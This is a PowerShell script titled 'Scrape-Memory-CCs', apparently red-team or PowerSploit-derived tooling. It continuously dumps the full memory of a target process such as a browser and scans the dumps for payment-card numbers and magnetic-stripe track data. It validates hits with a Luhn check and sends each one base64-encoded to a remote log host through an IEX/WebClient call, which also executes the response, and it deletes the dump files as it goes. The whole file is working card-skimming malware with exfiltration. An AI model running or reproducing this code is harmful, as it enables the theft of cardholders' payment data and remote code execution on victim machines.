function Scrape-Memory-CCs
{ 
<#
.DESCRIPTION
Scrape-Memory-CCs will continously dump memory of a specified process and search for track data or credit card numbers.

.PARAMETER Process
 Specifies the process for which a dump will be generated. The process object is obtained with Get-Process.

.PARAMETER DumpFilePath
Specifies the path where dump files will be written. By default, dump files are written to the current working directory. Dump file names take following form: processname_id.dmp

.PARAMETER User
A specific user profile to monitor, acts as a filter

.PARAMETER Bin
A specific Bank Identification Number to look for, acts as a filter

.PARAMETER LogHost
A server to send base64 encoded / scraped log results to, via http GET request

.PARAMETER Logging
Switch to enable logging

.PARAMETER NumsOnly
Switch to only scrap cc nums

.EXAMPLE
PS C:\> Scrape-Memory-CCs -Proc iexplore -User bob
PS C:\> Scrape-Memory-CCs -Proc iexplore -User bob -Bin 123456 -LogHost 192.168.5.5 

.LINK
https://github.com/ahhh/PSSE/blob/master/Scrape-Memory-CCs.ps1
https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
http://scriptolog.blogspot.com/2008/01/powershell-luhn-validation.html 
http://www.shellntel.com/blog/2015/9/16/powershell-cc-memory-scraper

.NOTES
Great script, have been adopting it slowly

#>
	[CmdletBinding()]
	Param (
	
	
		[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
		[String]
		$Proc,
	
		[Parameter(Position = 1)]
		[ValidateScript({ Test-Path $_ })]
		[String]
		$DumpFilePath = $PWD,
	
		[Parameter(Mandatory=$false)]
		[String]$LogHost,
	
		[Parameter(Mandatory=$false)]
		[string[]]$User,
	
		[Parameter(Mandatory=$false)]
		[Switch]$NumsOnly = $False,
		
		[Parameter(Mandatory=$false)]
		[Switch]$Logging,
	
		[Parameter(Mandatory=$false)]
		[String]$Bin
	)
	
	# Following code heavily adopted from:
	# https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
	# Author: Matthew Graeber (@mattifestation)
	# License: BSD 3-Clause
	function Out-Minidump
	{	
		BEGIN
		{
			$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
			$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
			$Flags = [Reflection.BindingFlags] 'NonPublic, Static'
			$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
			$MiniDumpWithFullMemory = [UInt32] 2
		}
	
		PROCESS
		{
			$Process = $p
			$ProcessId = $Process.Id
			$ProcessName = $Process.Name
			$ProcessHandle = $Process.Handle
			$ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
	
			$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
	
			$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
	
			$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
														$ProcessId,
														$FileStream.SafeFileHandle,
														$MiniDumpWithFullMemory,
														[IntPtr]::Zero,
														[IntPtr]::Zero,
														[IntPtr]::Zero))
	
			$FileStream.Close()
	
			if (-not $Result)
			{
				$Exception = New-Object ComponentModel.Win32Exception
				$ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"
	
				# Remove any partially written dump files. For example, a partial dump will be written in the case when 32-bit PowerShell tries to dump a 64-bit process.
				Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue
	
				throw $ExceptionMessage
			}
			else
			{
				Get-ChildItem $ProcessDumpPath
			}
		}
		END {}
	}
	
	# Luhncheck code sourced from: http://scriptolog.blogspot.com/2008/01/powershell-luhn-validation.html
	function Test-LuhnNumber([int[]]$digits){
	
		[int]$sum=0
		[bool]$alt=$false
	
		for($i = $digits.length - 1; $i -ge 0; $i--)
		{
			if($alt)
			{
				$digits[$i] *= 2
				if($digits[$i] -gt 9) { $digits[$i] -= 9 }
			}
			$sum += $digits[$i]
			$alt = !$alt
		}
		return ($sum % 10) -eq 0
	}
	
	function Write-Log ($logstring, $color = "White")
	{
		$LogFile = "mem_output.txt"
		$timestamp = Get-Date
		if ($Logging) 
			{ Add-Content $LogFile -value "[$timestamp] - $logstring" }
		else 
			{ Write-Host "[$timestamp] - $logstring" -ForegroundColor $color }
	}
	
	function Send-Cred($cred) {
		if ($LogHost) {
			$cred = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cred.Value))
			IEX (new-object net.webclient).downloadstring("http://$LogHost/$cred") -ErrorAction SilentlyContinue
		}
	}
	
	function main {
	
		# Save mem dumps to present working directory
		$dest = $PWD
		$cardnumbers = @()
		
		Write-Log "Starting Scraper"
		while (1) 
		{
			if ($User) 
			{
				# Use wmi
				$process = (Get-WmiObject win32_process | where{$_.ProcessName -match $Proc})
				$procs = @()
				foreach ($p in $process) 
				{
					foreach ($u in $User) 
					{
						if ($p.getowner().User -eq $u) 
						{
							$p = Get-Process -Id $p.ProcessId
							$procs += $p
						}
					}
				}
			}
			else 
			{
				$Procs = Get-Process $Proc -ErrorAction SilentlyContinue #| Select -Property Responding
			}
			if ($Procs) 
			{
				Write-Log "Target process is running. Dumping memory..."
				foreach ($p in $Procs) 
				{
					Out-Minidump -DumpFilePath $dest
				}
				$dumps = Get-ChildItem -Path $dest -Filter *.dmp | select FullName
				foreach ($d in $dumps) 
				{
					Write-Log "Scraping memory dump: $($d.FullName)"
					if ($NumsOnly) 
					{
						# Find basic cc num patern, high fp      
						$nums = (Select-String -Path $d.FullName -Pattern "(4[0-9]{15}|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})" | foreach {$_.matches} | Select-String -NotMatch "(\d)\1{5,}")
					}
					else 
					{
						# Default to finding full track data  
						$nums = (Select-String -Path $d.FullName -Pattern "\%B[\d]{16}[\^\w\s\/\d]+\?" | foreach {$_.matches})       
					}
			
					foreach ($td in $nums) 
					{
						if ($cardnumbers -notcontains $td.Value) 
						{
							if ($NumsOnly) 
							{
								if ($Bin) 
								{
									if ($td -match $Bin) 
									{
										Write-Log "CARD NUM: $td" "green"
										Send-Cred($td)
									}
								}
								else 
								{
									# Luhn test our result before logging
									if (Test-LuhnNumber([int[]][string[]][char[]]($td.Value))) 
									{
										Write-Log "POSSIBLE CARD NUM: $td" "green"
										Send-Cred($td)
									}
								}
							}
							else 
							{
								Write-Log "TRACK DATA: $td" "green"
								Send-Cred($td)
							}
						}
						$cardnumbers += $td.Value
					}
					Write-Log "removing dump file: $($d.FullName)"
					Remove-Item $d.FullName
				}
			}
			else 
			{
				Write-Log "Target process not running"
			}
			sleep 10
		}
	}
	main
}
